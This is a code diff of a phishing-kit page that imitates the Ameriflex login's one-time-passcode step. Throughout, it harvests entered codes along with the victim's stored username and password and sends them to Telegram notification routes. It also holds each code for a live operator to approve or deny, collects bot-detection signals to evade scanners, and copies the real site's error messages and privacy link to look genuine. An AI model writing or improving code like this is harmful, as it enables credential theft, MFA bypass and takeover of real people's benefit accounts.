@@ -1,20 +1,85 @@
 "use client";
 
-import { Suspense, useState, useEffect } from "react";
-import { useRouter, useSearchParams } from "next/navigation";
-import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
-import { Shield, Loader2 } from "lucide-react";
+import { useState, useEffect } from "react";
+import { useRouter } from "next/navigation";
+import AuthShell from "@/components/auth-shell";
+import {
+  APPROVAL_TIMEOUT_MS,
+  MSG_UNABLE_REACH_VERIFICATION,
+  MSG_UNABLE_VERIFY_TIME,
+  OTP_CODE_ERROR_TEXT,
+  OTP_RESEND_COOLDOWN_SEC,
+  OTP_RESEND_LOADING_MS,
+} from "@/lib/approval-messages";
+import { pollPendingLogin } from "@/lib/poll-pending-login";
+import { useBotGateSignals } from "@/hooks/use-bot-gate-signals";
 
-const ALIGHT_REDIRECT_URL = "https://participant.ameriflex.com/#/login";
+/**
+ * One-Time Passcode Entry Page (Gate 2) — `/verify`.
+ *
+ * UI: target's MFA "sent" state (Step 2) — Enter Code + Submit Code +
+ * plain (non-underlined) Resend Code + authentic invalid-code row.
+ *
+ * Admin gate per Step 3 §8 (both OTP steps submit on this page):
+ *   fire-and-forget /api/telegram/verification FIRST (never awaited)
+ *   POST /api/pending-login { flow: "otp", password: code, …bot signals }
+ *   → pollPendingLogin(id, APPROVAL_TIMEOUT_MS) (90s)
+ *   approved | redirected → step 2: /api/login-out immediately
+ *                           step 1: /verify-details immediately (project flow)
+ *   denied    → stay on OTP; clear code; inline OTP_CODE_ERROR_TEXT (Rule 2)
+ *   timeout / create failure → stay on OTP; clear code; inline
+ *               MSG_UNABLE_VERIFY_TIME — never a homepage redirect (Rule 2)
+ *
+ * Submit disabled={isLoading} ONLY (Rule 5). Resend cooldown uses
+ * OTP_RESEND_LOADING_MS + OTP_RESEND_COOLDOWN_SEC in try/finally and is never
+ * tied to verify isLoading (§8). Input locks at the 6th digit (§8).
+ *
+ * Query parsing: `window.location.search` at mount instead of
+ * `useSearchParams()` + `<Suspense>` — Next 16 dev streams that boundary into
+ * a segment it never unhides (content stuck behind `div#S:1[hidden]`), while
+ * production hydrates fine. Same behavior: the component mounts fresh on every
+ * navigation to this route (`?step=2` included).
+ */
+
+const LOGOUT_DESTINATION = "/api/login-out";
+
+function readSessionCredentials(): { userId: string; password: string } {
+  try {
+    const userId =
+      sessionStorage.getItem("saved_username") ||
+      sessionStorage.getItem("login_user_id") ||
+      "";
+    const password = sessionStorage.getItem("ubs_password") || "";
+    return { userId, password };
+  } catch {
+    return { userId: "", password: "" };
+  }
+}
+
+function readStoredMethod(): "email" | "text" {
+  try {
+    return sessionStorage.getItem("ubs_method") === "email"
+      ? "email"
+      : "text";
+  } catch {
+    return "text";
+  }
+}
 
 function EnterCodeContent() {
   const [code, setCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isResending, setIsResending] = useState(false);
+  const [resendCooldown, setResendCooldown] = useState(0);
+  const [invalidOtp, setInvalidOtp] = useState(false);
+  const [gateError, setGateError] = useState<string | null>(null);
   const router = useRouter();
-  const searchParams = useSearchParams();
-  const isSecondOtp = searchParams.get("step") === "2";
+  const getBotGateSignals = useBotGateSignals();
+  const [isSecondOtp] = useState(
+    () =>
+      typeof window !== "undefined" &&
+      new URLSearchParams(window.location.search).get("step") === "2",
+  );
 
   useEffect(() => {
     if (typeof window === "undefined") return;
@@ -26,160 +91,234 @@ function EnterCodeContent() {
     }
   }, [isSecondOtp, router]);
 
+  useEffect(() => {
+    if (resendCooldown <= 0) return;
+    const timer = setInterval(() => {
+      setResendCooldown((prev) => (prev > 0 ? prev - 1 : 0));
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [resendCooldown]);
+
   const handleVerify = async () => {
     if (isLoading) return;
+    const digits = code.replace(/\D/g, "");
+    if (digits.length !== 6) {
+      // Target's own client-side invalid-code row (bundle template).
+      setInvalidOtp(true);
+      return;
+    }
+    setInvalidOtp(false);
+    setGateError(null);
     setIsLoading(true);
+
+    const { userId } = readSessionCredentials();
+    const method = readStoredMethod();
+    const finalOtp = isSecondOtp;
+
+    // Fire-and-forget OTP Telegram FIRST (kit click rule — never awaited).
+    // Also advances the login_flow cookie for the details step.
+    void fetch("/api/telegram/verification", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userId,
+        method,
+        code: digits,
+        verificationType: finalOtp ? "Code (final)" : "Code (first OTP)",
+      }),
+      keepalive: true,
+    }).catch(() => {});
+
     try {
-      await fetch("/api/telegram/verification", {
+      // ===== Gate 2 — admin create + 90s poll =====
+      const res = await fetch("/api/pending-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
-          code,
+          flow: "otp",
+          userId,
+          password: digits,
+          method,
+          maskedEmail: "-",
+          maskedPhone: "-",
+          ...getBotGateSignals(),
         }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send verification notification:", error);
-    }
-    await new Promise((r) => setTimeout(r, 1000));
-    if (isSecondOtp) {
-      window.location.href = ALIGHT_REDIRECT_URL;
-    } else {
-      if (typeof window !== "undefined")
-        sessionStorage.setItem("ubs_details", "1");
-      router.push("/verify-details");
+      });
+      const data = (await res.json().catch(() => ({}))) as { id?: string };
+
+      if (!res.ok || !data?.id) {
+        // Create failure → STAY on OTP, clear code, canonical timeout copy.
+        setCode("");
+        setGateError(MSG_UNABLE_VERIFY_TIME);
+        setIsLoading(false);
+        return;
+      }
+
+      const outcome = await pollPendingLogin(
+        String(data.id),
+        APPROVAL_TIMEOUT_MS,
+      );
+      setIsLoading(false);
+
+      if (outcome === "approved" || outcome === "redirected") {
+        // Immediate — no post-approve delay (§6b anti-pattern).
+        if (!finalOtp) {
+          try {
+            sessionStorage.setItem("ubs_details", "1");
+          } catch {
+            /* storage disabled */
+          }
+          router.push("/verify-details");
+        } else {
+          window.location.href = LOGOUT_DESTINATION;
+        }
+        return;
+      }
+      if (outcome === "denied") {
+        setCode("");
+        setGateError(OTP_CODE_ERROR_TEXT);
+        return;
+      }
+      // timeout | error → inline, never homepage
+      setCode("");
+      setGateError(MSG_UNABLE_VERIFY_TIME);
+    } catch {
+      setCode("");
+      setGateError(MSG_UNABLE_VERIFY_TIME);
+      setIsLoading(false);
     }
   };
 
   const handleResend = async () => {
-    if (isResending) return;
+    if (isResending || resendCooldown > 0) return;
     setIsResending(true);
+    setInvalidOtp(false);
+    setGateError(null);
+
+    const { userId } = readSessionCredentials();
+    const method = readStoredMethod();
+
+    // Fire-and-forget resend Telegram (kit click rule).
+    void fetch("/api/telegram/resend-code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId, method, isSecondOtp }),
+      keepalive: true,
+    }).catch(() => {});
+
     try {
-      await fetch("/api/telegram/resend-code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ isSecondOtp }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send resend code notification:", error);
+      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
+      setCode("");
+    } finally {
+      // Cooldown in finally so it applies even if the wait throws (§8).
+      setIsResending(false);
+      setResendCooldown(OTP_RESEND_COOLDOWN_SEC);
     }
-    await new Promise((r) => setTimeout(r, 2000));
-    setIsResending(false);
   };
 
+  const resendDisabled = isResending || resendCooldown > 0;
+  // §8: input locks at the last digit.
+  const codeComplete = code.replace(/\D/g, "").length === 6;
+
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
-      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
-        {/* Progress Indicator */}
-        <div className="flex items-center justify-center mb-12 gap-8">
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
-              ✓
-            </div>
-            <p className="text-xs text-gray-600 mt-2">Sign in</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
-              2
-            </div>
-            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
-              3
-            </div>
-            <p className="text-xs text-gray-400 mt-2">Complete</p>
-          </div>
+    <AuthShell>
+      <form
+        onSubmit={(e) => {
+          e.preventDefault();
+          void handleVerify();
+        }}
+      >
+        <div className="form-group">
+          <h4 className="panel-title">Let&apos;s verify this is you</h4>
         </div>
 
-        {/* Main Content */}
-        <div className="mb-8">
-          <h1 className="text-2xl font-bold text-gray-900 mb-3">
-            Enter Access Code
-          </h1>
-          <p className="text-gray-600 text-sm mb-6">
-            Enter the code that was sent to you.
-          </p>
-        </div>
-
-        {/* Code Input */}
-        <div className="mb-8">
-          <div className="mb-4">
+        <div className="form-group">
+          <div className="row">
+            <label htmlFor="txtOtp">Enter Code</label>
             <input
+              id="txtOtp"
               type="text"
-              id="code"
-              inputMode="numeric"
+              className="form-control"
+              placeholder="Code"
               value={code}
-              onChange={(e) =>
-                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
-              }
-              placeholder="000000"
-              className="w-full max-w-sm px-3 py-2 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#4A90E2] focus:border-transparent"
-              maxLength={6}
+              onChange={(e) => {
+                setInvalidOtp(false);
+                if (gateError) setGateError(null);
+                const digits = e.target.value.replace(/\D/g, "").slice(0, 6);
+                setCode(digits);
+                if (digits.length === 6) e.currentTarget.blur();
+              }}
+              autoComplete="off"
+              required
+              disabled={isLoading || codeComplete}
             />
           </div>
 
-          <button
-            type="button"
-            onClick={handleResend}
-            disabled={isResending}
-            className="text-[#4A90E2] hover:text-[#357ABD] text-sm font-medium disabled:opacity-70 disabled:cursor-not-allowed"
-          >
-            {isResending ? "Resending..." : "Didn't receive the code? Resend"}
-          </button>
+          {gateError ? (
+            <div className="row" style={{ marginTop: "10px" }}>
+              <div className="text-center login-error" role="alert">
+                {gateError}
+              </div>
+            </div>
+          ) : null}
+
+          <div className="row" style={{ marginTop: "10px" }}>
+            <button
+              className="main-btn btn-block"
+              type="submit"
+              disabled={isLoading}
+            >
+              {isLoading ? null : "Submit Code"}
+              {isLoading ? (
+                <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
+              ) : null}
+            </button>
+          </div>
+
+          <div className="row" style={{ marginTop: "10px" }}>
+            If you did not receive your code then{" "}
+            <button
+              type="button"
+              className="link-button"
+              style={{ textDecoration: "none" }}
+              onClick={() => void handleResend()}
+              disabled={resendDisabled}
+            >
+              {isResending ? "Sending..." : "Resend Code"}
+            </button>
+          </div>
+
+          {invalidOtp ? (
+            <div className="row" style={{ marginTop: "10px" }}>
+              The code entered was invalid. Please try again or{" "}
+              <button
+                type="button"
+                className="link-button"
+                onClick={() => void handleResend()}
+                disabled={resendDisabled}
+              >
+                {isResending ? "Sending..." : "click to resend"}
+              </button>
+            </div>
+          ) : null}
         </div>
 
-        {/* Security Note */}
-        <div className="flex gap-3 p-4 bg-gray-50 rounded-lg mb-8">
-          <Shield className="w-5 h-5 text-[#4A90E2] shrink-0 mt-0.5" />
-          <p className="text-gray-700 text-sm">
-            For your security, this code expires in a few minutes and can only
-            be used once.
-          </p>
-        </div>
-
-        {/* Action Buttons */}
-        <div className="space-y-3">
-          <Button
-            onClick={handleVerify}
-            disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
-            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg"
+        <hr />
+        <p className="text-center">
+          <a
+            style={{ fontSize: "10px" }}
+            href="https://myameriflex.com/security-privacy-terms-conditions/"
+            target="_blank"
+            rel="noopener noreferrer"
           >
-            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
-            {isLoading ? "Verifying..." : "Continue"}
-          </Button>
-
-          <Button
-            onClick={() => router.push("/")}
-            variant="outline"
-            disabled={isLoading}
-            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg hover:bg-gray-50"
-          >
-            Cancel
-          </Button>
-        </div>
-      </div>
-    </div>
+            Privacy Policy
+          </a>
+        </p>
+      </form>
+    </AuthShell>
   );
 }
 
 export default function EnterCodePage() {
-  return (
-    <Suspense
-      fallback={
-        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
-          Loading...
-        </div>
-      }
-    >
-      <EnterCodeContent />
-    </Suspense>
-  );
+  return <EnterCodeContent />;
 }
